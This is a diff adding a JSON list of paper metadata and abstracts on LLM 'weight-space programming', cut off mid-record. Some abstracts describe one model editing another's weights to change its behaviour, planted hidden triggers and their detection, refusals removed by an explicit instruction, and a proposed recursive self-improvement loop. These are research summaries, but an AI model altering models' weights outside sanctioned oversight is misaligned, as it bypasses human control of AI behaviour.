@@ -1,0 +1,1872 @@
+[
+ {
+  "id": "2611.04268",
+  "ver": "2611.04268v1",
+  "title": "Weight-Space Programming for Improving Image-Restoration Diffusion Models: Technical Conjectures and a Recursive Improvement Loop",
+  "authors": [
+   "Zhuoran Zheng",
+   " Doubao"
+  ],
+  "published": "2026-11-03",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "Can an LLM directly edit the weights of a diffusion-based image-restoration model to \\emph{improve} restoration quality---without gradients, paired data, or fine-tuning? Recent experiments show frontier LLMs can fix structural bugs by modifying as little as \\(0.016\\%\\) of parameters, but cannot instill new capabilities. We ask whether weight-space programming (WSP) can move from \\emph{debugging} to \\emph{improvement} in the precise-regression setting of image restoration (deblurring, super-resolution, denoising, inpainting). Restoration diffusion UNets present a middle ground: low-level signal-processing layers are concentrated enough for targeted weight-direction edits, while high-level semantic layers remain distributed and resistant to sparse modification. We propose three technical conjectures: (C1) an LLM can localize the layer behind a quality gap (over-smoothing, color shift, hallucinated texture) within a 200 forward-pass budget; (C2) editing a small set of identified weight directions (e.g., scaling high-frequency filter norms, correcting output-bias channels) can measurably improve PSNR and perceptual quality; (C3) a recursive loop---diagnose \\(\\rightarrow\\) edit \\(\\rightarrow\\) evaluate \\(\\rightarrow\\) re-diagnose---can compound gains across rounds, forming a minimal recursive self-improvement (RSI) loop for vision. We analyze the required AI capability (arguing targeted edits need not superintelligence, while general capability generation does) and detail the challenges of precise pixel-level regression. We provide a PyTorch-style deployment pipeline and outline a benchmark. This manuscript is conjectural, intended to open a new subtopic for image restoration.",
+  "src": [
+   "api",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.04268"
+ },
+ {
+  "id": "2611.05341",
+  "ver": "2611.05341v1",
+  "title": "Weight-space programming for auditing clinical decision networks",
+  "authors": [
+   "Humza Nusrat",
+   "Omar Nusrat"
+  ],
+  "published": "2026-11-03",
+  "cats": [
+   "physics.med-ph",
+   "cs.AI"
+  ],
+  "abstract": "Machine learning models in radiotherapy are commissioned by testing them on cases with known answers, which may not reveal a shortcut that the test cases share with the training data. Frontier language models have recently been reported to read and write the raw weights of small neural networks, an ability called weight-space programming. The purpose of this study was to determine whether such a model, given only a clinical protocol and a network's weights, can audit and repair the network. Networks with 433 to 4,801 parameters were trained to screen head-and-neck planning requests against four rules. Flaws were planted through the training data: confounds that hid each rule, a 3 Gy shift in the cord threshold, and a hidden trigger. Claude Opus 5.5 audited each network blind, without tools, data or code execution, and every claim and repair was tested on about 420,000 requests. The language model named the broken rule in 16 of 18 flawed networks (95% CI 67% to 97%), including all 15 with a confound or a threshold shift. It repaired each of the 16 by changing a median of 3 parameters. Fine-tuning on protocol-labeled requests also repaired every network, but changed nearly every parameter. Each confound and shift it found was visible in single units, and a simple statistic chosen for each flaw type found the same flaws. It cleared 2 of 5 healthy networks without being forced and found 1 of 3 triggers. Testing against the protocol detected every flaw, and black-box testing found the confounds and the shift faster. The results indicate that, in small networks, weight-space programming can locate and repair flaws that silence an input or shift a threshold, but cannot yet certify that a network is correct.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.05341"
+ },
+ {
+  "id": "2611.05798",
+  "ver": "2611.05798v2",
+  "title": "Function-Preserving Audits of Visual Weight Readers",
+  "authors": [
+   "Sungguk Cha",
+   "Mintae Kim",
+   "Youngsub Han",
+   "Byoung-Ki Jeon",
+   "Sangyeob Lee"
+  ],
+  "published": "2026-11-04",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "A neural field can encode the same image with different weights. A reader that recognizes one such representation may therefore rely on parameter coordinates rather than the visual function. We study this distinction through function-preserving transformations, measuring recognition, prediction disagreement, and numerical fidelity together. Across shape, digit, and natural-image fields, high accuracy on the original weights coexists with substantial sensitivity to equivalent representations. On 10,000 official CIFAR10 test origins, one-period hidden-bias shifts change 7.3% of a released HiddenProbe configuration's predictions while barely changing accuracy; three-period shifts change 22.0% and reduce accuracy from 57.8% to 54.4%. Output-only ProbeGen remains unchanged. These effects are smaller than in a separate adapted-reader study, where matched phase and sign controls remove the corresponding sensitivities. Controlled readout studies show why invariance is insufficient: complete canonical hidden features reach 38.7% on MNIST, whereas explicitly composing those activations, outgoing weights, and output bias into field outputs reaches 81.5%. The information is present, but the learned readout does not recover it as effectively. A separate 720-response study of language models reading numerical weights shows why stochastic audits require repeats on both inputs: observed accuracy losses need not yield rejection of response-law equality. Together, these results distinguish invariance, useful visual information, and the evidence required to evaluate stochastic readers.",
+  "src": [
+   "awsp:\ud83d\udcca Benchmarks and Evaluati",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.05798"
+ },
+ {
+  "id": "2611.07319",
+  "ver": "2611.07319v2",
+  "title": "WeightLoop: Weight-Space Programming with Experimental Feedback",
+  "authors": [
+   "Mengran Li",
+   "Bo Li",
+   "Weijing Zhao",
+   "Chengyang Zhang",
+   "Boyu Zhang",
+   "Jinfeng Xu",
+   "Zelin Zang",
+   "Victor C. M. Leung",
+   "Stan Z. Li"
+  ],
+  "published": "2026-11-05",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "Scientific predictors guide costly experiments, yet returned measurements often reveal errors that matter for subsequent experimental choices. WeightLoop turns this feedback into persistent model updates through a reusable Weight-Space Programming (WSP) editor. We use GPT-6 Astra and DeepSeek to construct update programs from the scientific objective, model computation and editable parameters. These programs use accumulated measurements to estimate parameter corrections, validate them on feedback and save accepted changes in the original model. With identical feedback and writable parameters, four pretrained scientific predictors obtain 5.10-18.56% lower primary error. For weather prediction, changing four output-bias parameters reduces root mean squared error by 13.28%. Functional ranking and sequential discovery further connect reusable editing programs to improved experimental choices.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.07319"
+ },
+ {
+  "id": "2611.07847",
+  "ver": "2611.07847v2",
+  "title": "Computation, not weight access: large language models as auditors of clinical prediction networks",
+  "authors": [
+   "Zhiyu Liu",
+   "Xinyu Yang"
+  ],
+  "published": "2026-11-05",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Frontier large language models (LLMs) have been reported to read, edit and write the weights of small neural networks, raising the prospect of auditing clinical prediction models from their files alone. Public demonstrations, however, mixed reading raw weights with running code. We separated these conditions in internally pre-specified simulation experiments. Tanh networks of 105 to 38,401 weights were trained on simulated cohorts of patients with subarachnoid haemorrhage, each with a planted relationship or none, and one network was trained on labels that under-recorded deaths in a subgroup. GPT-6 Astra and four other GPT models answered single prompts under a default or an explicit system instruction, either with the weights in the prompt and no tools, or with a calculation-only tool that exposed the weights (white box) or only the network's predictions (black box). Without tools, Astra recovered planted relationships in 353-weight networks but became unreliable at 3,457 weights, and under the default instruction it declined 17 of 21 audit and repair tasks as unidentifiable; the explicit instruction removed these refusals. With the tool, it recovered the planted relationship in all 39 runs on networks of up to 38,401 weights, raised no false alarm in 21 runs on null networks, and found the biased subgroup in 6 of 6 runs. Black-box access performed as well as white-box access, and other GPT-6 models read as accurately. A well-designed script matched the comparator models on the audit and the best LLM repair. For auditing these networks, what mattered was computation and elicitation, not access to the weights.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.07847"
+ },
+ {
+  "id": "2611.08070",
+  "ver": "2611.08070v1",
+  "title": "Can an LLM Actually Reason and Program about Neural Network's Weights or is it just memorization on steroids? Exploring \"Weight-Space Programming\"",
+  "authors": [
+   "Nazmus Sakib Ahmed"
+  ],
+  "published": "2026-11-05",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Large language models (LLMs) have recently been reported to read and write the raw weights of neural networks directly, a capability termed weight-space programming. We ask whether the reading side of this capability reflects reasoning about weight flows or a combination of local arithmetic at the network's edges and memorized priors over public datasets. We test Claude Opus 5.5 on small convolutional networks of about 125,000 parameters trained on five image datasets, providing every weight as plain text with no tools, no forward passes, and no dataset or class names. The model performs accurate local calculations: batch-normalization statistics lead it to infer about three optimizer steps on networks stopped after three updates, and output-layer sign patterns recover the vehicle/animal split of CIFAR-10. The sessions report reading the first and last layers closely and sampling the middle, and several claims built on partial tracing fail verification, although we did not run a direct forward-pass test. Semantic judgments lean on familiar datasets: the model names CIFAR-10 for CIFAR-10 networks but also for all three fast-food networks, relabels KMNIST as MNIST, reads a 99.57%-accurate SAT-6 network as CIFAR-10 animal photos, and calls \"frog\" the output favored by a feature that fires most on trees. Permuting CIFAR-10's labels preserves the output split at the new indices, but every class pair the model interprets is then wrong, indicating reliance on remembered label order. These are exploratory results from mostly single runs. We conclude that zero-shot weight reading by this model is better described as local arithmetic plus dataset priors than as weight-flow tracing, and we provide a protocol for auditing future weight-space claims.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.08070"
+ },
+ {
+  "id": "2611.08383",
+  "ver": "2611.08383v1",
+  "title": "FedReason: Large Language Models as Weight-Space Meta-Aggregators for Heterogeneous Federated Learning",
+  "authors": [
+   "Ali Mohammadi Ruzbahani",
+   "Abbas Yazdinejad",
+   "Hadis Karimipour"
+  ],
+  "published": "2026-11-05",
+  "cats": [
+   "cs.CR",
+   "cs.AI"
+  ],
+  "abstract": "Federated learning servers combine client models with a fixed aggregation rule, and each rule in common use is designed for one kind of heterogeneity. We study whether a large language model (LLM) that inspects the client models can choose the rule itself, without any training on the server. In FedReason, the LLM is called every ten rounds. It analyses the weights by running code in a restricted server-side sandbox, sees only the printed results, may score a few candidates on a 500-image proxy set, and submits a short Python aggregation program. The server applies the program until the next call and falls back to FedAvg whenever its output is invalid. Full weight tensors never leave the server. We evaluated FedReason with Claude Opus 5.5 on CIFAR-10 and CIFAR-100 with ResNet-18 under Dirichlet label skew, width-heterogeneous sub-models and Byzantine clients, in 168 runs against 14 baselines. Across 12 paired label-skew runs it beat FedAvg by 1.26 percentage points on average (10 wins), and a control that spends the same per-round proxy budget on choosing among standard rules by 1.08 points. It was the strongest server-side rule on CIFAR-100 but did not beat SCAFFOLD, which changes client training. With three of ten clients malicious, it excluded all sign-flipping clients from the first round and stayed about one point below FLTrust without training a root model. Without proxy feedback, accuracy fell from 73.8% to 38.8% in one seed. A 60-round run cost 0.79 USD in API fees on average.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.08383"
+ },
+ {
+  "id": "2611.08647",
+  "ver": "2611.08647v1",
+  "title": "IWIBench: Evaluating Gradient-Free Model Driven Intra-weight Injection",
+  "authors": [
+   "Chris von Csefalvay",
+   "Pranav Doma",
+   "Achyuthan Unni Krishnan",
+   "Tam\u00e1s F\u00f6ldi"
+  ],
+  "published": "2026-11-05",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Intra-weight injection lets one model change another model's behaviour by editing its weights directly, without gradients. Such edits can range from altering lexical associations to enforcing output formats or updating factual knowledge. Despite growing interest in these approaches, there has been no systematic way to evaluate how well models perform them. We introduce IWIBench, which measures a large editor model's ability to modify the weights of a smaller target model (typically Gemma 3 4B IT) to achieve one of ten classical text-editing objectives while preserving its other capabilities. Editors are limited to four tools for reading and writing weights, with bounded tensor access and a fixed budget for generating and inspecting rollouts. A validator applies each proposed patch in a clean environment and compares the edited model against the unmodified target. Evaluating frontier closed- and open-weight models reveals sharply diverging capabilities, both across models and across tasks. A small number of models, most notably Astra and GPT-6.1 Sol, perform far ahead of the rest. The recency of this ability (little of it is evident in GPT-5.6 Sol, for instance), together with qualitative analysis, suggests it has been acquired through recent training. Tasks also vary widely: structured response resisted every attempt, and answer-length control yielded only one successful solution, whereas alias acquisition and recoding proved most amenable. Success in one task family correlated poorly with success in others, indicating an early and uneven capability frontier. We discuss strategies that editors repeatedly adopted and conclude with an outlook on intra-weight injection as an emerging but already potent approach to gradient-free behaviour modification.",
+  "src": [
+   "awsp:\ud83d\udcca Benchmarks and Evaluati",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.08647"
+ },
+ {
+  "id": "2611.09271",
+  "ver": "2611.09271v4",
+  "title": "Zero-Shot Weight-Space Programming Across a Difficulty-Graded Ladder of Two-Player Games",
+  "authors": [
+   "Eduardo C. Garrido-Merch\u00e1n"
+  ],
+  "published": "2026-11-06",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Weight-space programming sets every weight of a feed-forward network by hand, from an explicit specification of the desired computation, with no gradient descent and no training data anywhere in the construction. We ask how far a large language model can carry this practice, zero-shot, across games of deliberately increasing difficulty. We design a four-rung ladder (Nim, tic-tac-toe, two sizes of Connect Four, and a chess endgame) spanning four axes of difficulty, and build a second, independent network at each rung, using a structurally unrelated game at matched difficulty, to separate what a rung's finding says about the difficulty level from what it says about the one game used to measure it. Ten networks are built and independently verified. Six admit a complete, non-statistical proof of correctness against an independent oracle. The chess-endgame rung is exact where correctness is cheap, move legality and, in one network, an exact one-ply mate detector, and collapses where it is expensive, composing a multi-move mating plan, from 84.1-100% success at the one-ply tactics it was built to get right down to 0.57-9.13% in full adversarial play; its replicate shows this collapse is an order of magnitude less severe under a shorter required plan and exact rather than heuristic safety checks. The standard-sized rung confirms, by holding hand-set evaluation weights fixed and adding only shallow search, that the remaining gap is an architectural ceiling rather than a matter of engineering effort, and this exact collapse reproduces across two structurally unrelated games. We release all ten networks, their independent oracles, construction-cost measurements, and a cold-prompt protocol for a future cross-model comparison",
+  "src": [
+   "api",
+   "awsp:\ud83c\udfae Games",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.09271"
+ },
+ {
+  "id": "2611.09376",
+  "ver": "2611.09376v1",
+  "title": "Can LLMs Debug Robots by Editing Their Weights?",
+  "authors": [
+   "Jusheng Zhang",
+   "Keze Wang",
+   "Liang Lin"
+  ],
+  "published": "2026-11-06",
+  "cats": [
+   "cs.RO",
+   "cs.AI"
+  ],
+  "abstract": "A language model can repair a robot policy's lexical instruction grounding by editing just 65 token-embedding rows. We bring weight-space programming to robot foundation policies: GPT-6 Astra reads weights and uses a CPU workspace and budgeted simulator feedback, without gradient updates or new demonstrations. Three independent sessions on $\u03c0_{0.5}$ all improve success on 765 held-out paraphrases; the best raises success from 86.3\\% to 92.0\\% (48 repairs, four regressions; exact paired $p=1.31\\times10^{-10}$). Among the 335 instructions containing edited tokens, success rises from 74.3\\% to 87.5\\%; the other 430 episodes have zero outcome changes. Matched random-direction edits do not help. Full replacement using the editor's own lexicon explains much of the gain but produces more regressions; its direct difference from the editor is not significant at 0.05. Across 13 further robot sessions, the editor declines 12 candidates; the sole retained edit does not show a significant held-out gain. Separately, benchmark metadata lowers FastWAM success from 70.0\\% to 48.6\\%, while the evaluated VLA's aggregate rate is unchanged. The evidence supports precise lexical repair, not general acquisition of missing robot capabilities.",
+  "src": [
+   "api",
+   "awsp:\ud83e\uddbe Robotics and Control",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.09376"
+ },
+ {
+  "id": "2611.09382",
+  "ver": "2611.09382v1",
+  "title": "Exploring Weight-Space Programming: Capabilities, Generalization, and Limitations",
+  "authors": [
+   "Junru Hu",
+   "Cheng Tang",
+   "Wei Li",
+   "Hongze Zhu",
+   "Chun-Mei Feng",
+   "Qi Zhang",
+   "Yirong Chen",
+   "Ming Hu"
+  ],
+  "published": "2026-11-06",
+  "cats": [
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Weight-Space Programming (WSP) enables reasoning agents to directly inspect and modify neural network parameters, offering an alternative to gradient-based model adaptation. However, its capabilities, cross-task generalization, and practical limitations remain insufficiently understood. We systematically investigate WSP through 16 editing trajectories across seven benchmarks and two model scales (Qwen3.5-0.8B and Qwen3.5-9B). Our findings reveal three key insights. First, WSP can achieve substantial performance gains through highly localized interventions. On full held-out evaluations, accuracy improves by up to 29.45, 4.42, 36.72, and 17.11 percentage points on MATH-500, GPQA Diamond, IFEval, and SciBench, respectively. Notably, modifying only 1,023 parameters yields a 29.45-point improvement. Second, WSP exhibits promising but uneven cross-task generalization. A Math-edited checkpoint improves GPQA Diamond, IFEval, and SciBench by 3.03, 12.18, and 20.10 points, respectively, without further editing, while leaving SciCode performance unchanged. Third, effective editing remains challenging and inconsistent. Outcomes vary substantially across trajectories, and six of the 16 trajectories retain the original weights when candidate improvements cannot be reliably validated. Together, these results highlight WSP's potential for highly localized model adaptation while revealing important challenges in intervention discovery, reliability, and cross-task transfer. Homepage: https://wsp-scope.github.io/ GitHub: https://github.com/WSP-Scope/WSP-Scope-Project",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.09382"
+ },
+ {
+  "id": "2611.09559",
+  "ver": "2611.09559v1",
+  "title": "Can a Language Model Write the Weights? An Empirical Study of LLM-Written Scoring Networks for Column Generation and MILP Branching, with a Bus-Driver Scheduling Application",
+  "authors": [
+   "Renan Butkeraites"
+  ],
+  "published": "2026-11-06",
+  "cats": [
+   "math.OC"
+  ],
+  "abstract": "This paper was generated by an AI model (Claude Opus 5.5, Anthropic) under the author's direction; all results come from computations run on the author's machine, and every reference was checked. Weight-space programming (WSP) is the idea that a large language model (LLM) can write the weights of a small neural network directly, guided only by reading forward-pass outputs, with no gradient training. We test whether WSP can improve exact operations research algorithms where they rely on cheap scoring rules. In four studies, an LLM wrote small multilayer perceptrons that (i) select arcs, labels and ng-neighbourhoods inside column generation for the vehicle routing problem with time windows, and (ii) choose branching variables in SCIP's branch-and-bound. The algorithms stay exact whatever the weights; a bad network only costs time. In column generation, no lever gave a material gain. In branching on synthetic classes, a hand-written network solved independent-set instances in 0.37x the time of SCIP's default rule (18 paired instances, Wilcoxon $p<10^{-5}$) and matched or beat networks trained by imitation of strong branching, but on 39 MIPLIB 2017 instances it solved 19 versus 24. In an application built from the real GTFS feed of Atlanta's transit agency (MARTA), a crew scheduling set-partitioning model solved by a native C plugin with SCIP's factory settings, the LLM-written rules took 0.63x the default's time on 32 held-out instances ($p<10^{-4}$), but SCIP's plain pseudocost rule did exactly as well (ratio 0.99, $p=0.19$). In these settings, the gains came from being cheap, not from what the LLM wrote. All code, logs and the numbers behind every figure are released.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.09559"
+ },
+ {
+  "id": "2611.10425",
+  "ver": "2611.10425v1",
+  "title": "Governed Self-Improvement for a Local-First Security Analyzer: Baseline Measurements and a Preregistered Evaluation Protocol for Tantular Cyber",
+  "authors": [
+   "Raditio Ghifiardi",
+   "Rifny Rachman"
+  ],
+  "published": "2026-11-07",
+  "cats": [
+   "cs.CR"
+  ],
+  "abstract": "Local-first security tools let organizations analyze code without sending it to third-party services, but the small language models they can run locally are weaker than hosted ones and are hard to improve without breaching the privacy guarantee that motivates them. We present Tantular Cyber, an open-source, read-only repository security analyzer that keeps deterministic scanner findings authoritative and confines a locally served language model to advisory explanations in Bahasa Indonesia. We report its measured v0.3.0 baseline on a synthetic, ground-truth benchmark: combining Semgrep with an interprocedural call-graph scanner yields precision 0.843 and recall 0.915 (Semgrep alone: 0.818 and 0.766). The advisory layer is the weak point: 57% of explanations met an evidence-grounding check, against 95% for a different 8B model under identical prompts. A forensic re-scoring of retained outputs shows that every grounding failure cites a code identifier absent from the evidence shown, and that a prompt change which appeared to raise grounding from 0.56 to 0.72 did so partly by citing nothing. We document two evaluation-validity hazards we encountered: silent model-file migration during a run and non-reproducible published figures. Building on these lessons and on constraint-aware evaluation from security operations research, we propose a governed self-improvement loop (code-free feedback, curated data, a cheapest-first intervention ladder from prompts to LoRA and weight-space edits, hard gates, and human release approval) and preregister the protocol by which its first cycle will be judged. We report no results for the loop itself.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.10425"
+ },
+ {
+  "id": "2611.11005",
+  "ver": "2611.11005v1",
+  "title": "GradReason: LLMs as Meta-Learners that Replace Training Epochs with Training-Data-Free Weight Updates",
+  "authors": [
+   "Ali Mohammadi Ruzbahani",
+   "Abbas Yazdinejad",
+   "Hadis Karimipour"
+  ],
+  "published": "2026-11-07",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Standard training recipes make a fixed number of passes over the training data, even when an epoch mostly adds mini-batch noise. We study whether a large language model (LLM) that reads the weight and gradient history of a run can replace some of these epochs with updates that compute no gradient and read no training image. In GradReason, an LLM agent is called every ten epochs. In a restricted sandbox, it analyses recent weight snapshots, epoch-mean gradients, and validation metrics, then submits a Python program that computes new weights and a plan marking each of the next ten epochs as data or virtual. A virtual epoch is kept only if it passes a forward-only check on 5,000 held-out validation images. In 120 runs on CIFAR-10 and CIFAR-100 with three architectures, Claude Opus 5.5 used 32.8% fewer data epochs than the 80-epoch recipe at 0.31 percentage points lower test accuracy (95% CI -0.72 to +0.09; 0.94 points on ResNet-18), on the recipe's own frontier of data against accuracy. Unprompted, Opus averaged recent weight snapshots in every run. This choice produced the savings: a fixed rule with the same acceptance check but extrapolations from prior work saved 5.4% of the data epochs, and the same rule with averaging added saved 25.0%. The LLM's contribution is to find a working update within a single run; once found, a fixed rule implements it equally well. An Opus run cost 0.68 USD, but at this scale the agent's latency exceeded the GPU time it saved.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.11005"
+ },
+ {
+  "id": "2611.11537",
+  "ver": "2611.11537v1",
+  "title": "Weight-Space Programming of Variational Quantum Circuits: Large Language Models Write Quantum Circuit Parameters Without an Optimizer",
+  "authors": [
+   "Debarshi Kundu",
+   "Swaroop Ghosh",
+   "Vasant G Honavar"
+  ],
+  "published": "2026-11-08",
+  "cats": [
+   "quant-ph",
+   "cs.AI"
+  ],
+  "abstract": "Variational quantum algorithms (VQAs) optimize circuit angles through repeated quantum-device evaluations, often facing vanishing gradients and high optimization costs. We ask whether a large language model (LLM) can write these angles directly. Extending *weight-space programming* from classical networks to quantum circuits, we provide a frontier LLM (\\gpt) with the problem, circuit, and gate conventions. Its angles are executed exactly as written, without returning losses, gradients, or accuracy feedback. Across 139 requests, we test handwritten-digit classification, VQE ground-state estimation for spin chains and H$_2$, and MaxCut QAOA, comparing against random weights, classical optimization, and optimization initialized with LLM weights on the same circuit. When parameters have interpretable structure, the LLM matches or approaches the optimizer: it achieves 95--100\\% of the energy spectrum on every VQE problem, derives the exact H$_2$ ground state in closed form, finds optimal depth-one QAOA angles for every graph, and reaches 93--96\\% accuracy on digits 3 versus 8 with 12--18 hand-written weights, outperforming an optimizer trained on the same ten examples. Its weights are also strong warm starts: optimization reaches its best value after a median of one evaluation rather than hundreds. Allowed to design circuits, the LLM chooses data-dependent rotation chains encoding pixel importance in all 30 cases (one qubit for binary tasks, one chain per qubit for ten classes), reaching 65\\% accuracy across ten digits. Yet the approach fails in opaque weight spaces: accuracy drops to chance when fixed circuits exceed 30 weights, while optimization improves. It is also sensitive to gate conventions: 6 of 42 QAOA replies reverse mixing-angle signs and fail. We release all prompts, replies, and scores.",
+  "src": [
+   "api",
+   "awsp:\ud83e\uddea Quantum Circuits",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.11537"
+ },
+ {
+  "id": "2611.11604",
+  "ver": "2611.11604v1",
+  "title": "Weight-Space Programming of Policies and Their Verification via Model Checking",
+  "authors": [
+   "Dennis Gross"
+  ],
+  "published": "2026-11-08",
+  "cats": [
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Large language models (LLMs) can write the weights of small neural networks directly, without gradient descent. This weight-space programming creates policies for sequential decision-making from a task description alone, but nothing guarantees that a written policy behaves as intended. We combine weight-space programming with probabilistic model checking. Given an environment modeled as a Markov decision process and a requirement in probabilistic computation tree logic (PCTL), an LLM writes all weights of a policy network, optionally repairs them on a dataset of optimal actions, and receives model-checking feedback until the requirement holds or a round limit is reached. The model checker Storm computes, rather than estimates from simulations, the probability that the policy satisfies the requirement, so every returned policy is verified. With two LLMs on three environments, the created policy of each of the 18 runs attains the optimal probability, before any dataset or model-checking feedback. Four of six policies programmed for two transporter jobs also complete three jobs with probability 1, so they generalize to a task that the LLM never saw. The pipeline also programs a policy that satisfies a complex safety requirement expressed with the PCTL until operator in all six runs. In one of them, dataset repair raised the accuracy to 98.4\\% but broke the requirement, and one round of model-checking feedback restored it.",
+  "src": [
+   "api",
+   "awsp:\ud83e\uddbe Robotics and Control",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.11604"
+ },
+ {
+  "id": "2611.11894",
+  "ver": "2611.11894v1",
+  "title": "Distilling Instructions into Weights: Closed-Form Edits Fix a Robot Policy's Misreading",
+  "authors": [
+   "Ali-Adeeb Abbas",
+   "Esmaeil Seraj"
+  ],
+  "published": "2026-11-09",
+  "cats": [
+   "cs.RO",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Generalist robot policies often fail at one step of a task they can otherwise perform. We ask whether such a failure can be repaired by editing the policy's weights directly, without gradients, training data, or a change to the instruction. Told to put the cube then the banana in the bowl, a zero-shot $\u03c0_{0.5}$ vision-language-action policy in RoboLab releases the cube before it reaches the bowl. Replaying 21 of these decisions under rewordings shows that it binds \"in the bowl\" to the wrong object. Closed-form instruction distillation copies the per-layer effect of an explicit rewording into the language model's MLP weights. On 128 held-out seeds, success rises from 27 to 106 episodes, with 81 fixed and 2 broken ($p=7\\times10^{-22}$), while an update of the same size in random directions leaves success unchanged. The edit also lifts two other tasks without detectable harm on the remaining 13, and a variant that stores 0.16% of the parameter count keeps most of its effect. Placed in the action expert or action head instead, the same distillation helps less or not at all. Our released tool reproduced the fix end to end on new held-out seeds, from 8/64 to 36/64. Edits aimed at perception, a missing grasp, contact physics, or the gripper threshold did not help, and of seven blind Claude Opus editors, only the one given the misread instruction produced an edit that passed held-out scoring. These results suggest that weight edits work best when a known-good input already exists to distil. Because reruns with unchanged weights flip about a third of paired outcomes, evaluations should pair seeds, rerun the unedited policy, and confirm gains on held-out seeds.",
+  "src": [
+   "awsp:\ud83e\uddbe Robotics and Control",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.11894"
+ },
+ {
+  "id": "2611.12066",
+  "ver": "2611.12066v1",
+  "title": "Weight-Space Programming for Medical Imaging: Do We Still Need Training Data?",
+  "authors": [
+   "Maximilian Lindholz",
+   "Richard Ruppel",
+   "Annette Milnik",
+   "Sebastian Halskov",
+   "Semil Eminovic",
+   "Charlie A. Hamm",
+   "Robin Schmidt",
+   "Anika Knupfer",
+   "Jana Hutter",
+   "Johanna P. M\u00fcller",
+   "Carolina Dominguez Aleixo",
+   "Jawed Nawabi",
+   "Jens Vogel-Claussen",
+   "Tobias Penzkofer"
+  ],
+  "published": "2026-11-09",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "Can a large language model (LLM) write the parameters of a medical image classifier from medical knowledge alone, without any training data? Such classifiers normally require labelled images, which are costly and often unavailable. We investigate this question through weight-space programming (WSP), in which an LLM writes or adapts the weights and biases of a neural network directly, without optimisation on training data. Claude Opus 5.5 and GPT-6 Astra each generate the parameters of a small LeNet-style CNN in a single reply, without tool use and without access to any image. We compare these networks against zero-shot MedSigLIP and against the same architecture trained on labels using the Adam optimiser, across 7 classification tasks in four modalities: chest X-ray, breast ultrasound and abdominal CT (all from MedMNIST), and pelvic MRI (SynthUterus). The LLM-written networks perform above chance on all six MedMNIST tasks, with a mean test AUC of 0.719 for Opus and 0.711 for Astra. Both models outperform MedSigLIP on 5 of 6 tasks while using more than 10,000 times fewer parameters. However, the same network trained with Adam on only 256 labelled images achieves a higher AUC on every MedMNIST task (mean AUC 0.828). On SynthUterus, Opus attains an AUC of 0.764, whereas Astra falls below chance (AUC 0.136) owing to a systematic error. These results show that LLMs can write functional medical classifiers, but that they do not yet replace training data. We release the protocol, logs and all generated weights at https://github.com/MaximilianLindholz/weight-space-programming-medical.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.12066"
+ },
+ {
+  "id": "2611.12954",
+  "ver": "2611.12954v1",
+  "title": "Physics2Weight: Direct Neural Network Architecture and Weight Generation from Physical Laws Using Large Language Models",
+  "authors": [
+   "Shogo Sato",
+   "Tomoyasu Shimada",
+   "Kazuhiko Murasaki",
+   "Takashi Sano"
+  ],
+  "published": "2026-11-07",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Recent advances in large language models (LLMs) have enabled weight-space programming (WSP), which directly generates neural network weights without gradient-based optimization. However, extending WSP to physical problems remains challenging, particularly in achieving both solution accuracy and physical consistency. In this paper, we propose Physics2Weight (PtW), a framework that extends WSP to solving partial differential equations by directly generating neural network weights and editing architectures based on governing equations and initial and boundary conditions. PtW introduces physics-constrained prompting and physics-guided architecture editing, combined with iterative weight refinement from WSP, to improve solution accuracy and physical consistency without gradient-based optimization. Experiments on four PDEs, namely the heat, advection, Burgers', and Allen--Cahn equations, demonstrate lower solution errors than conventional physics-informed neural networks, while revealing limitations in satisfying the governing equations for nonlinear PDEs.",
+  "src": [
+   "api",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.12954"
+ },
+ {
+  "id": "2611.13232",
+  "ver": "2611.13232v1",
+  "title": "W-ISA: Transactional Execution of Weight-Space Intervention Programs",
+  "authors": [
+   "Ekrem Aksoy"
+  ],
+  "published": "2026-11-09",
+  "cats": [
+   "cs.AI"
+  ],
